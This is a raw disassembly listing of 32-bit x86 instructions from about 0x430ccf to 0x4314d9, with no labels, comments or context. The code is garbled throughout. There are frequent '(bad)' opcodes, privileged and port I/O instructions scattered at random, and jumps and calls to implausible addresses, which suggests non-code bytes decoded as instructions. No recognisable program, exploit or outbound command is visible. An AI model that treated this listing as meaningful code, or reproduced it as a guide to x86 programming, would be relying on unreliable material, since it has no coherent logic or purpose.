  430ccf:	push   DWORD PTR [ebp-0x4]
  430cd2:	mov    BYTE PTR [ebp+0xa],0xff
  430cd6:	(bad)  
  430cd7:	int3   
  430cd8:	or     BYTE PTR [eax],al
  430cda:	(bad)  
  430cdb:	lea    eax,[edi]
  430cdd:	ins    BYTE PTR es:[edi],dx
  430cde:	(bad)  
  430cdf:	inc    DWORD PTR [ecx]
  430ce1:	push   eax
  430ce2:	mov    BYTE PTR [ebp+0x9],0x8b
  430ce6:	leave  
  430ce7:	les    edx,FWORD PTR [ebp+0x0]
  430cea:	in     al,dx
  430ceb:	call   DWORD PTR [ecx-0x75]
  430cee:	inc    ebp
  430cef:	cld    
  430cf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430cf6:	cld    
  430cf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430cfd:	pop    es
  430cfe:	mov    eax,DWORD PTR [eax]
  430d00:	clc    
  430d01:	test   eax,esi
  430d03:	je     0x430d7a
  430d05:	mov    eax,esi
  430d07:	cld    
  430d08:	add    al,0x80
  430d0a:	add    WORD PTR [ecx+0x0],ax
  430d0e:	fiadd  DWORD PTR [eax]
  430d10:	mov    BYTE PTR [eax],0x3d
  430d13:	push   0xffffffc3
  430d15:	push   edi
  430d16:	mov    edx,DWORD PTR [eax+0x51]
  430d19:	pop    edi
  430d1a:	lea    ebx,[ebx-0x8]
  430d1d:	ret    0x45
  430d20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d26:	xchg   eax,edi
  430d28:	mov    DWORD PTR [ebp-0x75],ecx
  430d2b:	push   esi
  430d2c:	clc    
  430d2d:	jne    0x430cff
  430d2f:	mov    ecx,0xf8450b0b
  430d34:	(bad)  
  430d35:	push   cs
  430d36:	or     BYTE PTR [ebp-0x3a],dh
  430d39:	cmp    eax,DWORD PTR [ecx]
  430d3b:	pop    esi
  430d3c:	(bad)  
  430d3d:	or     al,0x5
  430d3f:	inc    eax
  430d40:	leave  
  430d41:	jmp    0x40cf:0x25564204
  430d48:	leave  
  430d49:	in     eax,dx
  430d4a:	inc    DWORD PTR [eax-0x75]
  430d4d:	fimul  DWORD PTR [ebx-0x228139be]
  430d53:	inc    eax
  430d54:	nop
  430d55:	loopne 0x430d56
  430d57:	ret    
  430d58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d5e:	add    eax,0xff45e8f8
  430d63:	push   esi
  430d64:	push   DWORD PTR [ebp-0x39]
  430d67:	mov    eax,0x7edda46
  430d6c:	or     al,0x6
  430d6e:	push   DWORD PTR [ebp-0x3a]
  430d71:	cmp    eax,DWORD PTR [edx]
  430d73:	pop    esi
  430d74:	ret    
  430d75:	or     al,0x56
  430d77:	inc    ecx
  430d78:	push   ebp
  430d79:	jle    0x430d67
  430d7b:	inc    edx
  430d7c:	inc    ebp
  430d7d:	int    0x1
  430d7f:	inc    ecx
  430d80:	sub    BYTE PTR ds:0xe77541fc,ah
  430d86:	add    DWORD PTR [edx+0x1c],eax
  430d89:	retf   0xc38b
  430d8c:	adc    al,0x8b
  430d8e:	xchg   edx,eax
  430d8f:	push   ecx
  430d90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d96:	rcl    DWORD PTR [esi-0x9],cl
  430d99:	jne    0x430deb
  430d9b:	mov    eax,0x7c80ece
  430da0:	rol    DWORD PTR [esi],cl
  430da2:	div    DWORD PTR [ebp+0x50]
  430da5:	cmp    ecx,edx
  430da7:	pop    esi
  430da8:	dec    BYTE PTR [edx]
  430daa:	in     al,dx
  430dab:	inc    edx
  430dac:	sub    esp,ecx
  430dae:	inc    eax
  430daf:	(bad)  
  430db0:	push   eax
  430db1:	add    edx,DWORD PTR [eax-0x1f]
  430db4:	push   edi
  430db5:	add    dh,dh
  430db7:	leave  
  430db8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430dbc:	add    BYTE PTR [ecx+0x0],dl
  430dbf:	inc    ebp
  430dc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430dc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430dcc:	add    al,0x2
  430dce:	jmp    0x57eb928
  430dd3:	jne    0x430dbd
  430dd5:	mov    eax,DWORD PTR [edx]
  430dd7:	or     BYTE PTR [eax],al
  430dd9:	inc    ecx
  430dda:	stc    
  430ddb:	in     eax,dx
  430ddc:	ss inc eax
  430dde:	aas    
  430ddf:	out    0x7d,eax
  430de1:	inc    ecx
  430de2:	mov    ebp,ecx
  430de4:	lock ret 0x7d
  430de8:	and    ecx,DWORD PTR [ebx-0x171777]
  430dee:	add    bh,bh
  430df0:	aad    0xd7
  430df2:	add    dh,cl
  430df4:	clts   
  430df6:	(bad)  
  430df7:	call   0xffce0cfc
  430dfc:	hlt    
  430dfd:	iret   
  430dfe:	jge    0x430dd6
  430e00:	rol    DWORD PTR [esi-0x80],cl
  430e03:	jmp    0x1c5d10
  430e08:	out    dx,al
  430e09:	mov    eax,DWORD PTR [ebx]
  430e0b:	(bad)  
  430e0c:	pop    esi
  430e0d:	push   es
  430e0e:	cmp    al,0xe8
  430e10:	sar    edi,0x8
  430e13:	inc    DWORD PTR [edi]
  430e15:	inc    esi
  430e16:	(bad)  
  430e17:	loopne 0x430e97
  430e19:	push   edi
  430e1a:	push   cs
  430e1b:	push   ebx
  430e1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430e22:	add    BYTE PTR [ebp+0x50],al
  430e25:	push   eax
  430e26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e2c:	sub    edx,DWORD PTR [esi-0x24]
  430e2f:	jne    0x430de7
  430e31:	lods   eax,DWORD PTR ds:[esi]
  430e32:	mov    edx,DWORD PTR [edx-0x34]
  430e35:	dec    esi
  430e36:	out    0x83,eax
  430e38:	into   
  430e39:	push   edi
  430e3b:	loopne 0x430e0b
  430e3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e48:	rol    DWORD PTR [edx],0x8
  430e4b:	mov    esp,ecx
  430e4d:	cmp    DWORD PTR [ebx],0xc
  430e50:	mov    esi,0x5001c0
  430e55:	push   eax
  430e56:	push   cs
  430e57:	push   eax
  430e58:	(bad)  
  430e59:	sub    edx,edi
  430e5b:	push   esi
  430e5c:	adc    al,0xcb
  430e5e:	ins    DWORD PTR es:[edi],dx
  430e5f:	mov    eax,0x203e8
  430e64:	add    al,ah
  430e66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e6d:	add    dh,al
  430e6f:	add    ah,ch
  430e71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e77:	pop    ecx
  430e78:	or     eax,ebx
  430e7a:	cli    
  430e7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e81:	lea    ebp,[ebx]
  430e83:	mov    edx,DWORD PTR [edx-0x4]
  430e86:	dec    ecx
  430e87:	inc    ebp
  430e88:	shr    BYTE PTR [ebx],0x4b
  430e8b:	and    al,0x0
  430e8d:	(bad)  
  430e8e:	jne    0x430ed5
  430e90:	pop    eax
  430e91:	mov    al,0x5a
  430e93:	call   0x14210f2
  430e98:	and    al,0x85
  430e9a:	push   edx
  430e9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e9f:	dec    ebp
  430ea0:	mov    cl,0x23
  430ea2:	jmp    0x430e90
  430ea4:	mov    al,0xe7
  430ea6:	call   0x1391194
  430eab:	shr    DWORD PTR [eax+ebx*2],cl
  430eae:	lock (bad) 
  430eb0:	adc    eax,0x757f008d
  430eb5:	out    0x58,eax
  430eb7:	cmp    al,0x7
  430eb9:	pop    edx
  430eba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ec1:	push   ecx
  430ec2:	cld    
  430ec3:	mov    esi,0x3b0175
  430ec8:	and    al,0xb0
  430eca:	xor    BYTE PTR [edx+0x1],0x8b
  430ece:	add    ah,bh
  430ed0:	mov    edi,DWORD PTR [ebp-0x4]
  430ed3:	psubsw mm7,QWORD PTR [edi]
  430ed6:	add    DWORD PTR [ebp+0x0],ebp
  430ed9:	rcr    eax,1
  430edb:	mov    edi,ecx
  430edd:	and    eax,DWORD PTR [eax]
  430edf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ee5:	call   0x13011ce
  430eea:	add    al,cl
  430eec:	mov    ebp,esi
  430eee:	aam    0x83
  430ef0:	or     DWORD PTR [ecx],eax
  430ef2:	jne    0x430ee5
  430ef4:	mov    eax,DWORD PTR [eax]
  430ef6:	aam    0x0
  430ef8:	dec    ebp
  430ef9:	jne    0x430e86
  430efb:	cmp    ebx,eax
  430efd:	jb     0x430f4c
  430eff:	jmp    0x430e8c
  430f01:	mov    ebx,esp
  430f03:	int3   
  430f04:	dec    ebp
  430f05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f0c:	mov    edx,0x8b0a8b
  430f11:	cmp    ecx,DWORD PTR [eax]
  430f13:	jb     0x430eec
  430f15:	pop    edx
  430f16:	push   edi
  430f17:	cli    
  430f18:	pop    es
  430f19:	mov    eax,ecx
  430f1b:	jb     0x430f1f
  430f1d:	add    DWORD PTR [ebx],0xa
  430f20:	mov    eax,DWORD PTR [ebx]
  430f22:	int3   
  430f23:	add    bh,BYTE PTR [esi+0x75d10006]
  430f29:	jmp    0x430eb6
  430f2b:	mov    al,0xe8
  430f2d:	call   0x10411af
  430f32:	add    edx,DWORD PTR [ecx+ecx*8]
  430f35:	pop    edi
  430f36:	or     BYTE PTR [ecx-0x73],bl
  430f39:	pop    ecx
  430f3a:	inc    edi
  430f3b:	xor    al,0xeb
  430f3d:	push   ecx
  430f3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f44:	call   0xb21049
  430f49:	int3   
  430f4a:	sbb    BYTE PTR [esi],ch
  430f4c:	inc    ebp
  430f4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f53:	call   0x9c11c2
  430f58:	or     BYTE PTR [ebx-0x73],dl
  430f5b:	cmp    al,0x47
  430f5d:	mov    al,0x1
  430f5f:	jb     0x430f61
  430f61:	mov    al,0x10
  430f63:	push   eax
  430f64:	add    al,0x75
  430f66:	add    BYTE PTR [ebx],ch
  430f68:	add    ebx,esp
  430f6a:	int3   
  430f6b:	jne    0x430f7d
  430f6d:	movsx  edx,cl
  430f70:	add    DWORD PTR [eax],eax
  430f72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f79:	mov    gs,edi
  430f7b:	add    BYTE PTR [eax-0x50],ch
  430f7e:	add    al,ch
  430f80:	mov    eax,DWORD PTR [ecx]
  430f82:	sub    eax,DWORD PTR [eax]
  430f84:	jb     0x430ffb
  430f86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f8a:	jge    0x430f74
  430f8c:	add    al,0x1
  430f8e:	add    DWORD PTR [eax],0x0
  430f91:	jne    0x430f93
  430f93:	je     0x430fda
  430f95:	mov    eax,DWORD PTR [edi]
  430f97:	ror    BYTE PTR [ebp+0x4d],1
  430f9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430fa1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430fa7:	mov    DWORD PTR [ebx],ebp
  430fa9:	fadd   DWORD PTR [eax+0x75]
  430fac:	inc    eax
  430fad:	pop    eax
  430fae:	lea    ebx,[ecx+0x4f]
  430fb1:	push   0xb1000003
  430fb6:	out    dx,eax
  430fb7:	add    ebp,DWORD PTR [edx+edx*2]
  430fba:	add    BYTE PTR [ebx+ecx*4],bh
  430fbd:	mov    ch,BYTE PTR [ebx]
  430fbf:	jb     0x431033
  430fc1:	add    al,0x89
  430fc3:	push   eax
  430fc4:	call   0x842b5d36
  430fc9:	add    DWORD PTR [eax+eax*1],eax
  430fcc:	jae    0x430fe2
  430fce:	icebp  
  430fcf:	inc    ebp
  430fd0:	mov    eax,DWORD PTR gs:[ecx]
  430fd3:	int3   
  430fd4:	out    dx,al
  430fd5:	loopne 0x431024
  430fd7:	sub    eax,DWORD PTR [edx]
  430fd9:	push   0xffffff83
  430fdb:	pop    esi
  430fdc:	push   cs
  430fdd:	jl     0x430ff8
  430fdf:	add    al,0xaf
  430fe1:	xor    eax,0x832b6d00
  430fe6:	mov    eax,DWORD PTR [edx]
  430fe8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ff4:	inc    ebp
  430ff5:	shr    ebx,0x3
  430ff8:	or     DWORD PTR [eax],0x4
  430ffb:	push   0xffffffa5
  430ffd:	pop    esi
  430ffe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431005:	jmp    0x431064
  431007:	mov    edi,0xff0272
  43100c:	fdivr  QWORD PTR [ebp+0x5d]
  43100f:	push   0x4e
  431011:	pop    ecx
  431012:	call   0x435417
  431017:	mov    DWORD PTR [ebx],eax
  431019:	in     al,0xc8
  43101b:	rol    BYTE PTR [ebp-0x75],0xc1
  43101f:	call   0xad1200
  431024:	pop    esi
  431025:	enter  0xceff,0x8b
  431029:	repz mov ecx,DWORD PTR [ebp-0x34]
  43102d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431034:	je     0x431036
  431036:	or     DWORD PTR [ebx-0x74183b24],eax
  43103c:	jne    0x431022
  43103e:	jmp    0x431039
  431040:	push   DWORD PTR [edx-0x24]
  431043:	push   0x4d
  431045:	pop    ecx
  431046:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  43104a:	jge    0x431052
  43104c:	mov    eax,eax
  43104e:	sub    ebp,DWORD PTR [edx+0x24]
  431051:	pop    esi
  431052:	inc    ebp
  431053:	mov    esp,0x8b6077
  431058:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43105e:	lods   al,BYTE PTR ds:[esi]
  43105f:	add    BYTE PTR [ebx],bh
  431061:	enter  0xce73,0x49
  431065:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  43106d:	stc    
  43106e:	jge    0x4310e2
  431070:	jnp    0xdd4293df
  431076:	call   0xc6114c
  43107b:	fadd   st(0),st
  43107d:	dec    esi
  43107e:	ins    BYTE PTR es:[edi],dx
  43107f:	stc    
  431080:	cmp    al,0x73
  431082:	push   ebp
  431083:	mov    eax,0xf8028b
  431088:	jne    0x43104b
  43108a:	mov    esi,ecx
  43108c:	mov    esp,DWORD PTR [ebp+0x2c]
  43108f:	add    edi,DWORD PTR [ebp-0x24]
  431092:	sub    esp,eax
  431094:	and    al,0x45
  431096:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  43109c:	sbb    al,0xee
  43109e:	pop    esi
  43109f:	call   0x8310cf
  4310a4:	fsubr  st,st(3)
  4310a6:	sti    
  4310a7:	add    BYTE PTR gs:[ecx],bh
  4310aa:	add    eax,esp
  4310ac:	add    DWORD PTR [esi],eax
  4310ae:	rol    DWORD PTR [ebp+0x8],0x29
  4310b2:	mov    esp,eax
  4310b4:	clc    
  4310b5:	jne    0x43112c
  4310b7:	mov    eax,0x8b0673
  4310bc:	loopne 0x431103
  4310be:	loopne 0x431049
  4310c0:	lods   al,BYTE PTR ds:[esi]
  4310c1:	int3   
  4310c2:	inc    ebp
  4310c3:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310c7:	add    al,0xc3
  4310c9:	sub    ecx,DWORD PTR [ebp+0x47]
  4310cc:	(bad)  
  4310ce:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310d2:	add    eax,DWORD PTR [eax]
  4310d4:	call   0x644d1d9
  4310d9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310df:	dec    esi
  4310e0:	ins    DWORD PTR es:[edi],dx
  4310e1:	in     al,dx
  4310e2:	lea    eax,[eax]
  4310e4:	inc    ebp
  4310e5:	inc    ebp
  4310e6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310ec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310f6:	and    al,0xdc
  4310f8:	ror    DWORD PTR [edx+0x24],0xf7
  4310fc:	or     BYTE PTR [ebp+0x4c],dh
  4310ff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431103:	stos   BYTE PTR es:[edi],al
  431104:	adc    edx,edi
  431106:	inc    esp
  431107:	add    edi,DWORD PTR [eax]
  431109:	jne    0x4310ee
  43110b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431111:	cmp    ecx,DWORD PTR [edi]
  431113:	sub    BYTE PTR [ebp-0x7e],dl
  431116:	sar    ebp,0xb
  431119:	jmp    FWORD PTR [edi+0x2400392a]
  43111f:	sub    esi,DWORD PTR [ebx-0x73]
  431122:	mov    esp,DWORD PTR [ecx+edi*4]
  431125:	mov    ecx,DWORD PTR [eax]
  431127:	and    BYTE PTR [eax],al
  431129:	jne    0x4310f5
  43112b:	sub    ebp,ecx
  43112d:	sbb    BYTE PTR [esi+0x32],ah
  431130:	dec    ebp
  431131:	push   ebp
  431132:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431138:	ret    
  431139:	mov    edx,ebp
  43113b:	leave  
  43113c:	sub    DWORD PTR [esi+0x24],ebx
  43113f:	ret    0x2b
  431142:	pop    ax
  431144:	push   ebp
  431145:	rol    BYTE PTR [ebx],0xeb
  431148:	add    DWORD PTR [ecx+0x6c0001],0x40
  43114f:	jb     0x4311a6
  431151:	ret    
  431152:	in     al,dx
  431153:	jecxz  0x4310e0
  431155:	push   esi
  431156:	xchg   esp,eax
  431157:	jne    0x431159
  431159:	cmp    edx,DWORD PTR [esi+0x1c]
  43115c:	jne    0x431142
  43115e:	mov    eax,DWORD PTR [ebp-0x77]
  431161:	ror    DWORD PTR [ebx+0x899408],0xe0
  431168:	mov    esi,DWORD PTR [ebp-0x75]
  43116b:	pop    esi
  43116c:	nop
  43116d:	mov    eax,DWORD PTR [eax]
  43116f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431175:	add    al,0x0
  431177:	inc    ebp
  431178:	mov    eax,DWORD PTR [ebx]
  43117a:	mov    ebp,ebx
  43117c:	cmp    al,0xf
  43117e:	or     al,al
  431180:	inc    ebp
  431181:	inc    ebp
  431182:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431188:	cld    
  431189:	add    BYTE PTR [edi+0x546c16c0],dh
  43118f:	add    BYTE PTR [ecx-0x5],dl
  431192:	add    eax,0x17200
  431197:	sbb    al,0x85
  431199:	dec    esp
  43119a:	je     0x4311d4
  43119c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4311a0:	add    BYTE PTR [ebx],bh
  4311a2:	(bad)  
  4311a3:	and    al,0x32
  4311a5:	jae    0x431143
  4311a7:	mov    cl,cl
  4311a9:	inc    DWORD PTR [esp]
  4311ac:	push   ebp
  4311ad:	shr    esp,0x8
  4311b0:	in     al,dx
  4311b1:	push   esp
  4311b2:	add    DWORD PTR [eax],esp
  4311b4:	add    bl,cl
  4311b6:	inc    ebp
  4311b7:	mov    bh,0x89
  4311b9:	add    ah,bh
  4311bb:	jmp    0xca752105
  4311c0:	pushf  
  4311c1:	dec    esp
  4311c2:	mov    edx,0xf8178520
  4311c7:	fst    DWORD PTR [ebp+0x0]
  4311ca:	mov    BYTE PTR [eax],0xc4
  4311cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4311d0:	inc    ebp
  4311d1:	add    eax,0xc601da
  4311d6:	mov    al,0xc6
  4311d9:	ins    BYTE PTR es:[edi],dx
  4311da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311e1:	dec    esp
  4311e2:	jmp    DWORD PTR [eax]
  4311e4:	inc    ebp
  4311e5:	fnstcw WORD PTR [esi+0x29]
  4311e8:	test   BYTE PTR [eax],0xc8
  4311eb:	rol    BYTE PTR [eax],0xc0
  4311ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4311f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311fa:	inc    esi
  4311fb:	add    DWORD PTR [eax],ebx
  4311fd:	add    dh,bh
  4311ff:	mov    esi,DWORD PTR [edx+0x8]
  431202:	(bad)  
  431203:	fdiv   QWORD PTR ss:[ecx]
  431206:	(bad)  
  431207:	mov    bl,ch
  431209:	add    esi,eax
  43120b:	add    dh,bl
  43120d:	or     esi,eax
  43120f:	mov    dl,0xdf
  431211:	add    esi,eax
  431213:	add    al,ah
  431215:	push   cs
  431216:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43121d:	or     BYTE PTR [ebx],dh
  43121f:	dec    ecx
  431220:	lea    eax,[ebx]
  431222:	xor    eax,0x18fc0fc7
  431227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431228:	repz clc 
  43122a:	add    eax,DWORD PTR [ebp+0x46]
  43122d:	prefetcht0 BYTE PTR [ecx-0x2]
  431231:	xor    eax,0x7c60872
  431236:	mov    esp,0xbd32c69b
  43123b:	pop    esi
  43123c:	mov    cl,0xbe
  43123f:	or     al,0xc6
  431241:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431248:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43124f:	add    dh,al
  431251:	mov    eax,ebx
  431253:	xor    DWORD PTR [ebx],0x35008dbc
  431259:	mov    ecx,DWORD PTR [edi]
  43125b:	sbb    al,0x18
  43125d:	inc    ebp
  43125e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431265:	clc    
  431266:	(bad)  
  431267:	xor    DWORD PTR [edx-0x64],esi
  43126a:	lea    ecx,[ecx+0x45ffe838]
  431270:	mov    ecx,ebx
  431272:	fadd   st,st(6)
  431274:	dec    ebp
  431275:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43127b:	out    0x1,eax
  43127d:	inc    ebp
  43127e:	lea    ebp,ds:0xc8ffc6ff
  431284:	enter  0xa33,0xc6
  431288:	push   ebp
  431289:	leave  
  43128a:	(bad)  
  43128b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431291:	add    BYTE PTR [ebp+0x44],al
  431294:	mov    eax,esp
  431296:	mov    WORD PTR [esi+0x46398300],?
  43129c:	psubusw mm4,QWORD PTR [esi-0x78]
  4312a0:	add    BYTE PTR [ebx-0x1303f975],al
  4312a6:	add    BYTE PTR [ebp+0x1],0xeb
  4312aa:	add    BYTE PTR [ebp+0x38],al
  4312ad:	in     eax,dx
  4312ae:	inc    ebp
  4312af:	inc    ebp
  4312b0:	mov    ebx,ebx
  4312b2:	add    BYTE PTR [ebp+0x0],0xec
  4312b6:	mov    DWORD PTR [ebp-0x41],eax
  4312b9:	sub    eax,0x2c00454e
  4312be:	ins    DWORD PTR es:[edi],dx
  4312bf:	inc    ebp
  4312c0:	add    BYTE PTR [esi+0x66],bh
  4312c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312d4:	dec    edi
  4312d5:	pop    es
  4312d6:	add    ah,ch
  4312d8:	mov    DWORD PTR [ebp+0x68],eax
  4312db:	in     eax,dx
  4312dc:	inc    DWORD PTR [ebp-0x7d]
  4312df:	out    0xc0,al
  4312e1:	inc    ebp
  4312e2:	mov    edx,esp
  4312e4:	push   0x45
  4312e6:	(bad)  
  4312e7:	jmp    0xdf9258a4
  4312ec:	add    BYTE PTR [ebp-0x77],al
  4312ef:	out    dx,al
  4312f0:	ins    BYTE PTR es:[edi],dx
  4312f1:	inc    ebp
  4312f2:	jmp    edi
  4312f4:	add    DWORD PTR [ebp-0x14],0x7e
  4312f8:	mov    esi,esi
  4312fa:	outs   dx,BYTE PTR ds:[esi]
  4312fb:	inc    esp
  4312fc:	(bad)  
  4312fd:	mov    esp,0x8341b68d
  431302:	mov    DWORD PTR [esi+0x70],eax
  431305:	fcos   
  431307:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43130d:	in     al,dx
  43130e:	jb     0x431295
  431310:	(bad)  
  431311:	dec    DWORD PTR [ebx-0x7aba9901]
  431317:	mov    edi,edi
  431319:	fdivr  st,st(7)
  43131b:	out    dx,eax
  43131c:	rcl    BYTE PTR [ebx],0x66
  43131f:	mov    DWORD PTR [ebp-0xc70075],eax
  431325:	(bad)  
  431326:	std    
  431327:	cmp    eax,DWORD PTR [eax]
  431329:	jne    0x431391
  43132b:	mov    DWORD PTR [ebp-0xba0048],eax
  431331:	in     al,dx
  431332:	outs   dx,BYTE PTR ds:[esi]
  431333:	pushf  
  431334:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43133a:	inc    DWORD PTR [ecx]
  43133c:	inc    DWORD PTR [eax]
  43133e:	jae    0x431378
  431340:	add    BYTE PTR [ebp+0x850266],al
  431346:	inc    DWORD PTR [ebp-0x1]
  431349:	mov    eax,eax
  43134b:	jl     0x4313b3
  43134d:	add    BYTE PTR [ebp-0x740077],al
  431353:	cld    
  431354:	dec    eax
  431355:	add    BYTE PTR [eax],0x1
  431358:	data16 add BYTE PTR [ebp+0x38],al
  43135c:	mov    eax,0x47c2
  431361:	mov    eax,0x824f89
  431366:	inc    edi
  431367:	mov    DWORD PTR [edx+0x64],ebp
  43136a:	inc    WORD PTR [ebp-0x75]
  43136e:	(bad)  
  43136f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431376:	inc    ebp
  431377:	jge    0x431358
  431379:	add    bh,ah
  43137b:	lea    ax,[ebp-0x750030]
  431382:	add    al,0x46
  431385:	jmp    0x40ff:0x8885
  43138b:	push   DWORD PTR [ebp+0x52]
  43138e:	lea    eax,[eax]
  431390:	shl    BYTE PTR [esi-0x7b],1
  431393:	test   esi,edi
  431395:	(bad)  
  431396:	(bad)  
  431397:	inc    DWORD PTR [ebp-0x990140]
  43139d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4313a3:	inc    edi
  4313a4:	push   ecx
  4313a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4313ac:	add    al,al
  4313ae:	ret    
  4313af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313b6:	push   eax
  4313b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313be:	add    BYTE PTR [ebx-0x764f8839],al
  4313c4:	push   DWORD PTR [esi+0x1]
  4313c7:	inc    DWORD PTR [eax]
  4313c9:	mov    eax,0xff99ff
  4313ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313d4:	jne    0x43138e
  4313d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313e0:	mov    ecx,0xd74fb8
  4313e5:	add    cl,al
  4313e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313f4:	(bad)  
  4313f5:	push   ebp
  4313f7:	mov    eax,0x8c2789
  4313fc:	ret    0x6689
  4313ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431403:	add    bh,ah
  431405:	mov    WORD PTR [ebp-0x70],ax
  431409:	(bad)  
  43140a:	ret    0x667d
  43140d:	or     BYTE PTR [ebp-0x77],dl
  431410:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431417:	loop   0x4313a2
  431419:	(bad)  
  43141a:	xchg   esi,eax
  43141b:	aam    0xcf
  43141d:	out    dx,al
  43141e:	mov    DWORD PTR [esi-0x68],edi
  431421:	inc    ebp
  431422:	dec    edx
  431423:	pop    ecx
  431424:	mov    edx,DWORD PTR [eax]
  431426:	repnz push bp
  431429:	or     BYTE PTR [ebx+0x55106638],0x49
  431430:	(bad)  
  431431:	repnz xor eax,0xa0898945
  431437:	mov    ah,0x89
  431439:	jmp    DWORD PTR [edx+0x66b0418d]
  43143f:	inc    DWORD PTR [ebp+0x50]
  431442:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431446:	mov    DWORD PTR [eax],ecx
  431448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431449:	pop    es
  43144a:	inc    ecx
  43144b:	(bad)  
  43144c:	data16 fwait
  43144e:	inc    ebp
  43144f:	xor    ah,BYTE PTR [esi+0x3]
  431452:	dec    ebp
  431453:	push   eax
  431454:	inc    bp
  431456:	jge    0x4313db
  431458:	mov    esp,DWORD PTR [esi-0x18]
  43145b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431461:	add    DWORD PTR [ebx],esi
  431463:	add    BYTE PTR [ebx],al
  431465:	test   DWORD PTR [ebx],esi
  431467:	(bad)  
  431468:	inc    WORD PTR [ebp+0x0]
  43146c:	mov    eax,DWORD PTR [eax]
  43146e:	call   0x8898cba3
  431473:	mov    esi,eax
  431475:	clc    
  431476:	ret    
  431477:	rol    cl,0xa
  43147a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431480:	mov    edx,edi
  431482:	pushf  
  431483:	pop    es
  431484:	jmp    FWORD PTR [edx+0x66]
  431487:	add    BYTE PTR [ebp-0x990175],al
  43148d:	inc    ebp
  43148e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431494:	push   ebp
  431495:	mov    edi,eax
  431497:	mov    dh,BYTE PTR [eax+0x266ff51]
  43149d:	push   ebp
  43149e:	add    BYTE PTR [ebx-0x764b0777],al
  4314a4:	dec    DWORD PTR [esi+0x661851e8]
  4314aa:	add    BYTE PTR [ebp-0x7b],dl
  4314ad:	cmp    esi,0xfffffffb
  4314b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4314b6:	jmp    DWORD PTR [esi-0x75]
  4314b9:	push   ebp
  4314ba:	hlt    
  4314bb:	data16 (bad) 
  4314bd:	dec    ebp
  4314be:	ret    
  4314bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314c5:	lea    edx,[eax-0x1]
  4314c8:	jne    0x43149b
  4314ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314d0:	dec    BYTE PTR [ecx+0x51559eff]
  4314d6:	mov    DWORD PTR [esi-0x4c],esp
  4314d9:	push   ebp
